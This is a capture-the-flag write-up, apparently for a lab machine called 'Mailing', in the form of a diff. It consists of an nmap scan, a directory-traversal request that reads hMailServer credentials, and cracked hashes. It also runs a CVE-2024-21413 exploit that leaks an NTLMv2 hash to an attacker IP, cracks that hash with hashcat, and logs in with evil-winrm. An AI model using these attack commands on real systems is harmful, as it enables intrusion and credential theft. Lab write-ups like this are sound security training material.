@@ -1,0 +1,284 @@
+nmap:
+Scanning 10.129.47.178 [19 ports]
+Discovered open port 135/tcp on 10.129.47.178
+Discovered open port 25/tcp on 10.129.47.178
+Discovered open port 445/tcp on 10.129.47.178
+Discovered open port 143/tcp on 10.129.47.178
+Discovered open port 80/tcp on 10.129.47.178
+Discovered open port 587/tcp on 10.129.47.178
+Discovered open port 110/tcp on 10.129.47.178
+Discovered open port 993/tcp on 10.129.47.178
+Discovered open port 139/tcp on 10.129.47.178
+Discovered open port 47001/tcp on 10.129.47.178
+Discovered open port 5040/tcp on 10.129.47.178
+Discovered open port 465/tcp on 10.129.47.178
+Discovered open port 49665/tcp on 10.129.47.178
+Discovered open port 49668/tcp on 10.129.47.178
+Discovered open port 49664/tcp on 10.129.47.178
+Discovered open port 7680/tcp on 10.129.47.178
+Discovered open port 55662/tcp on 10.129.47.178
+Discovered open port 49666/tcp on 10.129.47.178
+Discovered open port 49667/tcp on 10.129.47.178
+Completed Connect Scan at 14:43, 0.15s elapsed (19 total ports)
+Initiating Service scan at 14:43
+Scanning 19 services on 10.129.47.178
+Completed Service scan at 14:46, 160.98s elapsed (19 services on 1 host)
+NSE: Script scanning 10.129.47.178.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 14:46
+NSE Timing: About 99.96% done; ETC: 14:46 (0:00:00 remaining)
+Completed NSE at 14:47, 40.27s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 14:47
+Completed NSE at 14:47, 3.39s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 14:47
+Completed NSE at 14:47, 0.00s elapsed
+Nmap scan report for 10.129.47.178
+Host is up, received user-set (0.074s latency).
+Scanned at 2024-05-05 14:43:43 EDT for 205s
+
+PORT      STATE SERVICE       REASON  VERSION
+25/tcp    open  smtp          syn-ack hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://mailing.htb
+|_http-server-header: Microsoft-IIS/10.0
+110/tcp   open  pop3          syn-ack hMailServer pop3d
+|_pop3-capabilities: USER TOP UIDL
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+143/tcp   open  imap          syn-ack hMailServer imapd
+|_imap-capabilities: ACL IDLE NAMESPACE RIGHTS=texkA0001 SORT IMAP4rev1 completed CHILDREN QUOTA CAPABILITY IMAP4 OK
+445/tcp   open  microsoft-ds? syn-ack
+465/tcp   open  ssl/smtp      syn-ack hMailServer smtpd
+|_ssl-date: TLS randomness does not represent time
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
+| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-27T18:24:10
+| Not valid after:  2029-10-06T18:24:10
+| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
+| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
+| -----BEGIN CERTIFICATE-----
+| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
+| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
+| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
+| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
+| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
+| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
+| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
+| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
+| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
+| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
+| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
+| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
+| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
+| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
+| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
+| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
+| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
+| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
+| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
+| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
+|_-----END CERTIFICATE-----
+587/tcp   open  smtp          syn-ack hMailServer smtpd
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
+| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-27T18:24:10
+| Not valid after:  2029-10-06T18:24:10
+| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
+| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
+| -----BEGIN CERTIFICATE-----
+| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
+| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
+| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
+| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
+| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
+| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
+| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
+| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
+| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
+| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
+| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
+| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
+| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
+| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
+| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
+| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
+| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
+| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
+| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
+| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent time
+| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+993/tcp   open  ssl/imap      syn-ack hMailServer imapd
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
+| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/localityName=Madrid/emailAddress=ruy@mailing.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-02-27T18:24:10
+| Not valid after:  2029-10-06T18:24:10
+| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
+| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
+| -----BEGIN CERTIFICATE-----
+| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
+| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
+| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
+| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
+| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
+| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
+| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
+| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
+| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
+| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
+| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
+| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
+| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
+| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
+| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
+| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
+| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
+| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
+| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
+| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
+|_-----END CERTIFICATE-----
+|_imap-capabilities: ACL IDLE NAMESPACE RIGHTS=texkA0001 SORT IMAP4rev1 completed CHILDREN QUOTA CAPABILITY IMAP4 OK
+5040/tcp  open  unknown       syn-ack
+7680/tcp  open  pando-pub?    syn-ack
+47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
+55662/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 8962/tcp): CLEAN (Timeout)
+|   Check 2 (port 52950/tcp): CLEAN (Timeout)
+|   Check 3 (port 62365/udp): CLEAN (Timeout)
+|   Check 4 (port 34707/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: 3s
+| smb2-time: 
+|   date: 2024-05-05T18:46:31
+|_  start_date: N/A
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 14:47
+Completed NSE at 14:47, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 14:47
+Completed NSE at 14:47, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 14:47
+Completed NSE at 14:47, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 205.09 seconds
+
+in webpage there is nothing to interact with but the download instrusction file that look like LFI attack could be the vector
+
+/download.php?file=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cProgram%20Files%20(x86)%5chMailServer%5cBin%5chMailServer.ini
+
+[Directories]
+
+ProgramFolder=C:\Program Files (x86)\hMailServer
+
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+
+[GUILanguages]
+
+ValidLanguages=english,swedish
+
+[Security]
+
+AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
+
+[Database]
+
+Type=MSSQLCE
+
+Username=
+
+Password=0a9f8ad8bf896b501dde74f08efd7e4c
+
+PasswordEncryption=1
+
+Port=0
+
+Server=
+
+Database=hMailServer
+
+Internal=1
+
+now taking this hashes and lets crack it with crackstation:
+
+841bb5acfa6779ae432fd7a4e6600ba7=homenetworkingadministrator
+
+to use this credentials we will be using CVE-2024-21413
+
+so download it and run it with this commands:
+
+python3 CVE-2024-21413.py - server mailing.htb - port 587 - username
+administrator@mailing.htb - password homenetworkingadministrator - sender
+administrator@mailing.htb - recipient maya@mailing.htb - url
+'<IP of the attacker>' - subject test
+
+and we get the NTLMv2 hash:
+
+maya::MAILING:d54e21a7baec67e0:424A1323F451663919DF61ACB01C9F9D:010100000000000080910722129FDA01569FC81BB25E279C000000000200080054004D0051004A0001001E00570049004E002D004C00390034004300450044004D004A00430033004D0004003400570049004E002D004C00390034004300450044004D004A00430033004D002E0054004D0051004A002E004C004F00430041004C000300140054004D0051004A002E004C004F00430041004C000500140054004D0051004A002E004C004F00430041004C000700080080910722129FDA01060004000200000008003000300000000000000000000000002000004537CD719FBCF856F17DFAF52DC22188663FE1DEF334EECF257C340507D5CF230A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100390039000000000000000000
+
+let hashcat crack it with:
+
+hashcat -a 0 -m 5600 maya.txt /usr/share/wordlists/rockyou.txt
+
+and we get the password:
+
+m4y4ngs4ri
+
+connecting with it via evil-winrm:
+
+evil-winrm -i <ip of the machine> -u maya -p m4y4ngs4ri 
+
+and we get the connection to the machine
+
+going to Desktop and get the user flag:
+
+05fa1f894341b10b0c6eb063e54e24e6
+
+
+
